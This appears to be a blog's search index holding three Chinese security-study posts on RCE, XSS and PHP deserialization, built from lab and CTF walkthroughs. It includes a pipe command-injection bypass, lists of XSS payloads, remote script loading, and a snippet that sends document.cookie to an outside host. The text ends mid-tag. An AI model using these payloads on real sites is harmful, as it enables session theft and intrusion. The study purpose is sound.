<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RCE漏洞</title>
    <url>/2023/03/08/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在web应用终，有些程序员为了考虑到灵活性、简洁性，会用代码调用代码或者命令执行函数去处理。如当应用在调用一些能将字符串转化成代码的函数的时候，没有考虑用户是否能构造攻击代码，或者待用系统命令处理，造成漏洞</p>
<p>如果网站不具有调用系统功能或者只是具有浏览的功能，一般不具有命令执行或代码执行漏洞</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>执行脚本代码</p>
<p>eval（）的作用是将传递过来的字符串当作代码来执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115140839667.png"
                      alt="image-20221115140839667"
                ></p>
<p>本来是代码执行但是如果加了echo&#96;&#96;之后就会变成命令执行，仅支持linux</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115151756723.png"
                      alt="image-20221115151756723"
                ></p>
<p>例子：白盒测试</p>
<p>打开靶场，发现代码但是加密了，转到在线php执行进行显示解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152343831.png"
                      alt="image-20221115152343831"
                ></p>
<p>解密结果echo<code>$_REQUEST[a]</code>;;?&gt;</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\hc\AppData\Roaming\Typora\typora-user-images\image-20221115152516888.png"
                      alt="image-20221115152516888" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152651166.png"
                      alt="image-20221115152651166"
                ></p>
<p>说明可以传输a这个值，发现key</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152812618.png"
                      alt="image-20221115152812618"
                ></p>
<p>查看key，解决！！！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152859228.png"
                      alt="image-20221115152859228"
                ></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>执行系统命令：ipconfig  ls  dir   等等如?x&#x3D;ipconfig</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115141516079.png"
                      alt="image-20221115141516079"
                ></p>
<p>例子：黑盒测试</p>
<p>靶场开启发现是执行ping命令的输入框，属于命令执行，所以应该是存在命令执行漏洞的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143426979.png"
                      alt="image-20221115143426979"
                ></p>
<p>想到可以利用|字符将多个命令并在一起</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143514018.png"
                      alt="image-20221115143514018"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143545698.png"
                      alt="image-20221115143545698"
                ></p>
<p>执行后发现存在过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143629368.png"
                      alt="image-20221115143629368"
                ></p>
<p>多点几次发现如下图片，说明是前端验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143725513.png"
                      alt="image-20221115143725513"
                ></p>
<p>查看代码发现前端具有检测代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143820671.png"
                      alt="image-20221115143820671"
                ></p>
<p>利用抓包改参数，抓包将127.0.0.1改为127.0.0.1|ls放掉数据包，发现绕过成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115144024189.png"
                      alt="image-20221115144024189"
                ></p>
<p>黑盒公开漏洞靶场演示</p>
<p>打开靶场发现是webmin，搜索一下发现是linux系统管理程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115153212760.png"
                      alt="image-20221115153212760"
                ></p>
<p>搜索漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115153301448.png"
                      alt="image-20221115153301448"
                ></p>
<p>网上教程一步一步来就行</p>
]]></content>
  </entry>
  <entry>
    <title>XSS漏洞</title>
    <url>/2023/03/08/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站中，当用户访问到有恶意代码的网页时就会产生xss攻击</p>
<h6 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h6><p>盗取账号，窃取数据，网站挂马，控制计算机等</p>
<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><p>对提交的数据进行过滤、对内容进行安全编码等</p>
<h6 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h6><p>反射型 存储型 dom型xss</p>
<script>alert("xss")</script>

<h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><p>非持久化需要欺骗用户自己去点击链接才能触发，当用户访问时，服务器接收该链接并进行处理，并把带有xss脚本的数据发送给用户浏览器，浏览器解析后，就会触发xss攻击</p>
<h6 id="反射性xss（get）"><a href="#反射性xss（get）" class="headerlink" title="反射性xss（get）"></a>反射性xss（get）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924140643197.png"
                      alt="image-20220924140643197"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924140738893.png"
                      alt="image-20220924140738893"
                ></p>
<p>注意：攻击过程中会有字数限制，可以对其检查源代码，更改限制字数，或者直接取消限制再输入</p>
<p>输入xss语句就可直接攻击成功</p>
<h6 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924141519304.png"
                      alt="image-20220924141519304"
                ></p>
<p>直接查看提示输入密码，即可输入，提交即可（无字数限制）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924141557125.png"
                      alt="image-20220924141557125"
                ></p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是由于代码是存储再服务器中的数据库里，比如个人信息，或者留言板，发表文章或评论的地方都可插入代码，如果过滤不严，用户访问该页面的时候就会触发代码执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924143304929.png"
                      alt="image-20220924143304929"
                ></p>
<p>直接攻击即可</p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DOM,是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构和样式，没有与服务器进行交互</p>
<p>原理：客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM数据并在本地执行。基于这个特性，就可以利用JS脚本来实现xss攻击（特殊的反射型xss漏洞）</p>
<h6 id="经常出现dom-xss的关键语句："><a href="#经常出现dom-xss的关键语句：" class="headerlink" title="经常出现dom xss的关键语句："></a>经常出现dom xss的关键语句：</h6><p>​       document.referer属性</p>
<p>​       window.name属性</p>
<p>​       location属性</p>
<p>​       innerHTML属性</p>
<p>​       documen.write属性</p>
<p>通过分析代码可得</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924151730303.png"
                      alt="image-20220924151730303"
                ></p>
<p>所以我们可以利用语句拼接进行过滤</p>
<p>在其中加入</p>
<p>#’ onclick&#x3D;”alert(111)”即可构造payload</p>
<p>或者使用javascript:alert(”xss“)即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152020554.png"
                      alt="image-20220924152020554"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152116336.png"
                      alt="image-20220924152116336"
                ></p>
<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924152941061.png"
                      alt="image-20220924152941061"
                ></p>
<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>在留言框中输入语句，并提交管理员视角中你的代码会生效</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924154934265.png"
                      alt="image-20220924154934265"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924155127889.png"
                      alt="image-20220924155127889"
                ></p>
<h3 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h3><p>正常输入<script>alert("xss")</script>语句发现被过滤掉了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924165211551.png"
                      alt="image-20220924165211551"
                ></p>
<p>输入&lt;script,发现被完全过滤，说明可能过滤了<script>语句，那咱们换一个</p>
<p>输入<a herf="#" onclick="alert('xss')">发现成功了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220924173150950.png"
                      alt="image-20220924173150950"
                ></p>
<p>或者输入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:/myblog/source/_posts/x"
                      onerror="alert('xss')"
                >也是一样的结果</p>
<h3 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h3><p>htmlspecialchars()函数把预定义的字符转换为HTML实体</p>
<ul>
<li>& （和号）成为 &amp;</li>
<li>" （双引号）成为 &quot;</li>
<li>' （单引号）成为 '</li>
<li>< （小于）成为 &lt;</li>
<li>&gt; （大于）成为 &gt;</li>
</ul>
<p>正常输入<script>alert("xss")</script>发现只有一个链接生成，所以可能是被a标签包含了，查看源码发现果然是a标签，而且&lt;&gt;符号也被过滤掉了，所以不能构造闭合</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925104552389.png"
                      alt="image-20220925104552389"
                ></p>
<p>构造payload，#’ onclick&#x3D;’alert(“xss”)’   出现弹窗</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925105822983.png"
                      alt="image-20220925105822983"
                ></p>
<h3 id="xss-herf"><a href="#xss-herf" class="headerlink" title="xss-herf"></a>xss-herf</h3><p>输入<script>alert("xss")</script>发现&gt;&lt;””全被过滤掉了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925110411280.png"
                      alt="image-20220925110411280"
                ></p>
<p>且在a标签的herf中，herf的值可以是URL，也可以执行javascript语句，所以输入javascript:alert(“xss”)试试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925110734950.png"
                      alt="image-20220925110734950"
                ></p>
<p>出现弹窗，攻击成功</p>
<h3 id="xss-js"><a href="#xss-js" class="headerlink" title="xss-js"></a>xss-js</h3><p>输入<script>alert("xss")</script>没反应，查看源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111416059.png"
                      alt="image-20220925111416059"
                ></p>
<p><img src="C:\Users\hc\AppData\Roaming\Typora\typora-user-images\image-20220925111503616.png" alt="![](https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111503616.png)"></p>
<p>发现你输入的语句被传到<script>标签中了，这几可以直接构造语句';alert("xss")//</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20220925111803641.png"
                      alt="image-20220925111803641"
                ></p>
<p>分析源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:/Users/hc/Desktop/1.jpg"
                     
                ></p>
<p>攻击成功</p>
<p>至此，pikachu靶场的全部xss漏洞都已经通关</p>
<h3 id="xss测试语句"><a href="#xss测试语句" class="headerlink" title="xss测试语句"></a>xss测试语句</h3><p>在网站中要验证是否存在xss漏洞，要输入一些标签如< >等，如果没有被过滤，则有着很大的可能存在xss漏洞</p>
<p>常用的测试语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h5&gt;1&lt;/h5&gt;</span><br><span class="line">&lt;span&gt;1&lt;/span&gt;</span><br><span class="line">&lt;a herf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure></div>

<p>语句闭合</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</span><br><span class="line">&#x27;&gt;&quot;&gt;&lt;span&gt;x&lt;.span&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>单行注释 //</p>
<h3 id="xss攻击语句"><a href="#xss攻击语句" class="headerlink" title="xss攻击语句"></a>xss攻击语句</h3><p>测试过后，确定具有xss漏洞，就可以构造攻击语句</p>
<p>常用语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>

<p>普通的xss    javascript注入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=http://3w.org/xss.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>IMG标签xss使用javascript命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IMG src=http://3w.org/xss.js/&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="xss常见利用"><a href="#xss常见利用" class="headerlink" title="xss常见利用"></a>xss常见利用</h3><p>xss可以实现很多功能，最重要的是可以构造xss漏洞去获取对方的cookie</p>
<p>获取网页cookie</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">js文件</span><br><span class="line">var img=document.createElement(&quot;img&quot;);</span><br><span class="line">img.src=&quot;http://www.xxx.com?&quot;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br><span class="line"></span><br><span class="line">传输上面的js文件</span><br><span class="line">&lt;script.src=&quot;http://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>



<p>攻击语句</p>
<p>'onfocus=javascript:alert('xss') > //</p>
<h3 id="http-only"><a href="#http-only" class="headerlink" title="http only"></a>http only</h3><p>开启http only后可有效的拦截xss获取cookie攻击，这样js脚本就不能获取到用户的cookie信息了（仅仅只能防止cookie被盗取）</p>
]]></content>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/03/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h6 id="序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象"><a href="#序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象" class="headerlink" title="序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象"></a>序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</h6><h6 id="而反序列化相反"><a href="#而反序列化相反" class="headerlink" title="而反序列化相反"></a>而反序列化相反</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006125723792.png"
                      alt="image-20221006125723792"
                ></p>
<h2 id="PHP语言方面"><a href="#PHP语言方面" class="headerlink" title="PHP语言方面"></a>PHP语言方面</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006125237103.png"
                      alt="image-20221006125237103"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006130726968.png"
                      alt="image-20221006130726968"
                ></p>
<p>#触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法（魔术方法触发条件：1.反序列化2.存在类2.类中存在魔术方法）：</p>
<p>__construct()&#x2F;&#x2F;创建对象时触发</p>
<p>__destruct() &#x2F;&#x2F;对象被销毁时触发</p>
<p>__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p>
<p>__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</p>
<p>__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</p>
<p>__isset() &#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发</p>
<p>__unset() &#x2F;&#x2F;在不可访问的属性上使用 unset()时触发</p>
<p>__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<p>先搞一把 PHP 反序列化热身题稳住-无类问题-本地</p>
<ol>
<li>序列化</li>
</ol>
<p>#代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/107b2839dfa4459085aa6d3ae3e6c56e10fb1ea1.png@378w_119h_progressive.webp"
                      alt="img"
                ></p>
<p>#序列化后的格式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ae2689d3c4e1c628443ca17dbb1d5b77a6b0c4f6.png@821w_282h_progressive.webp"
                      alt="img"
                ></p>
<p>#结果（这里没对象，因此从变量的数据类型s开始）</p>
<p>—string（字符串）；变量长度为6；变量名“xiaodi”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86b84fd2c8d846be944cbe2efb27d66a3a783f38.png@258w_51h_progressive.webp"
                      alt="img"
                ></p>
<ol start="2">
<li>反序列化</li>
</ol>
<p>#代码&#x3D;》结果（注意里面有“”，外面只能为单引号‘‘）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/883dcdd91c5507536123aaef5fc1e325d82ecd99.png@387w_104h_progressive.webp"
                      alt="img"
                ></p>
<p>3.本地源代码分析</p>
<p>—类之前</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ae7b8390488e37ca37e356e7eedf79f818b9016d.png@789w_464h_progressive.webp"
                      alt="img"
                ></p>
<p>—flag文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/8c30a28c570889ae1c2594e05976af82dd605aee.png@450w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>—类的内容（包含的魔术方法）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/8c75addc10af0eaa204991b839c9cbcf17c69199.png@831w_449h_progressive.webp"
                      alt="img"
                ></p>
<p>—类之后（主函数）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/483139f9863f5099a0f42a7ca819688996ea1484.png@566w_236h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>访问脚本</li>
</ol>
<p>—这里参数不等，所以显示源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7debf97f1d0840558db1855597d169c065ee67d8.png@831w_416h_progressive.webp"
                      alt="img"
                ></p>
<p>—输入参数s:6:”xiaodi”;（执行了包含文件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/560707902f91b56c845c5639ee806c6d55211f8a.png@831w_218h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li>key&#x3D;123</li>
</ol>
<p>—str&#x3D;i(数字型没有长度)<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/0ab8eceff950f3ea98800acd4f0de7e01720fca6.png@300w_66h_progressive.webp"
                      alt="img"
                ></p>
<p>—key&#x3D;’123’(变成字符串)<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/6961ec408c6e16a9c7712d0e21d9f6b66807dd05.png@173w_41h_progressive.webp"
                      alt="img"
                ></p>
<p>在撸一把 CTF 反序列化小真题压压惊-无类执行-实例</p>
<ol>
<li>理论分析（题目找不到，只能理论分析）</li>
</ol>
<p>—表单是死的，点不动，根据提示发现是传参</p>
<ol start="2">
<li>源代码分析</li>
</ol>
<p>—包含flag.php文件</p>
<p>—如果get传参不为空，就显示源码</p>
<p>—如果get没传数据，cookie传参反序列化和包含文件的key相等（注意是&#x3D;&#x3D;&#x3D;，即要求数值型也要相等），就输出flag变量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b9deb8e451a6b1bcc43f9977761cf861c3c244d7.png@831w_642h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>解题分析（重点）</li>
</ol>
<p>—$key赋值在下方，所以前面判断的时候key为空（代码执行的先后顺序问题）</p>
<p>—要执行cookie，get传递的参数应该为空</p>
<p>—应该将空序列化（注意空不是空格）</p>
<p>然后抗一把 CTF 反序列化练习题围观下-有类魔术方法触发-本地</p>
<ol>
<li>执行本地代码</li>
</ol>
<p>—创建对象触发construct方法，输出构造函数</p>
<p>—反序列化触发wakeup方法，输出苏醒函数（序列化会检查方法内是否存在sleep函数，如果存在就优先调用；反序列化就调用wakeup函数）</p>
<p>—最后一个程序结束后触发destruct函数，输出析构函数</p>
<p>—如果有tostring函数，存在echo时或者拼接字符串时都会被调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ec3cb316f70d64697aa1d6605dff99a39a867ec0.png@576w_453h_progressive.webp"
                      alt="img"
                ></p>
<p>—结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/3ec041f3a99ef724b8b58f8a7c2487581b6f0475.png@680w_141h_progressive.webp"
                      alt="img"
                ></p>
<p>最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例</p>
<ol>
<li>靶场源代码分析</li>
</ol>
<p>#主函数（传递参数有效就将参数反序列化）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eca2355345d2e80678fe102f37a0a1ea154cab42.png@831w_369h_progressive.webp"
                      alt="img"
                ></p>
<p>#类之前（包含文件，高亮源代码）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/94b7e769c91a429f3f7892a21b69ba0b4913bab5.png@318w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>#类的源代码</p>
<p>第一：获取 flag 存储 flag.php</p>
<p>第二：两个魔术方法__destruct __construct</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/3296161e64b53d5bd821f1e0d6183eb552794d73.png@806w_360h_progressive.webp"
                      alt="img"
                ></p>
<p>第三：传输 str 参数数据后触发 destruct（反序列化之后，相当于添加了一个对象（但是不会触发construct方法，因为是反序列化得来的）。但是会在最后触发destruct方法），存在 is_valid 过滤（如果OP&#x3D;&#x3D;&#x3D;2，赋值为1；否则就将content赋值为空，调用process方法）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6bb11455f4872c691e0df24efcf001705db18ce9.png@621w_200h_progressive.webp"
                      alt="img"
                ></p>
<p>第四：__destruct 中会调用 process,其中 op&#x3D;1 就写入， op&#x3D;2 就调用读取方法并且赋值给res，再打印res（output（）为打印）,否则就输出坏黑客。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/10ab0390ab548cec6332c9c6764d5776686ac228.png@776w_312h_progressive.webp"
                      alt="img"
                ></p>
<p>#写入（OP&#x3D;1写入）</p>
<p>—如果filename和content都存在，并且content的长度小于100，就将content写入filename，并且输出成功。否则输出失败。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/165c60a65d871366dfbab60073b6110be4bef70b.png@831w_299h_progressive.webp"
                      alt="img"
                ></p>
<p>#读取（OP&#x3D;2读取）</p>
<p>—如果filename存在，就读取文件。并且打印读取的内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e02e16a2b26f910b0d350633166723c9e5e21caf.png@831w_218h_progressive.webp"
                      alt="img"
                ></p>
<p>第五：涉及对象 FileHandler，变量 op 及 filename,content，进行构造输出</p>
<p>#原理解析（涉及：反序列化魔术方法调用，弱类型绕过，ascii 绕过）</p>
<p>—-使用该类对 flag 进行读取，这里面能利用的只有__destruct 函数（析构函数）。</p>
<p>—-__destruct 函数对$this-&gt;op 进行了&#x3D;&#x3D;&#x3D;判断并内容在 2 字符串时会赋值为 1（但是process 函数中使用&#x3D;&#x3D;对$this-&gt;op 进行判断（为 2 的情况下才能读取内容））</p>
<p>—-因此这里存在弱类型比较，可以使用数字 2 或字符串’ 2’绕过判断。</p>
<p>—-is_valid 函数还对序列化字符串进行了校验，因为成员被 protected 修饰，因此序列化字符串中会出现 ascii 为 0 的字符。经过测试，在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰</p>
<p>总结：</p>
<p>—传参Str&#x3D;》destruct方法（强类型对比）</p>
<p>—OP值对比&#x3D;&#x3D;&#x3D;类型 值</p>
<p>—OP&#x3D;‘ 2’字符串；OP&#x3D;‘2’不成立</p>
<p>—成立，强制op&#x3D;1，反之OP&#x3D;你设置的值</p>
<p>—process（）弱类型对比，将’ 2’和‘2’对比是一致的</p>
<ol start="2">
<li>设置含类的反序列化</li>
</ol>
<p>—要修改原来代码的protect的三个变量（因为原类没有值），只能重新构造filehandler类</p>
<p>—重新构造类之后，序列化类传参</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/666424fcb84169e30f425c07c3b90299b5f138db.png@825w_300h_progressive.webp"
                      alt="img"
                ></p>
<p>#序列化结果</p>
<p>—o表示object对象</p>
<p>—11是对象名的长度</p>
<p>—“FileHandler”为对象名称</p>
<p>—对象中有3个变量</p>
<p>—3个变量的变量类型都是string</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2d036c56254c983fff180654b539a42e4423664a.png@566w_71h_progressive.webp"
                      alt="img"
                ></p>
<p>#将反序列化的语句序列化验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/148734bc1e1de1d005bf6f91b21c852876bed9dc.png@831w_195h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>传递参数</li>
</ol>
<p><img  
                     lazyload
